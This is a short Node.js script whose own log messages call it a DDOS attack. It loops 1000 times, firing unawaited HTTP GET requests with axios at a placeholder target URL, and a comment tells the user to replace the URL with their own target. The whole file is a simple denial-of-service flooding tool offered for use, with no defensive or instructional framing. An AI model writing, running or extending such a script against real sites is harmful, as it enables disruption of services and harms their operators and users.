const axios = require('axios');

const targetUrl = 'http://example.com'; // Replace with your target URL
const loopCount = 1000; // Number of requests to send

console.log(`Starting DDOS attack on ${targetUrl} with ${loopCount} requests...`);

for (let i = 0; i < loopCount; i++) {
  axios.get(targetUrl);
}

console.log('DDOS attack completed.');
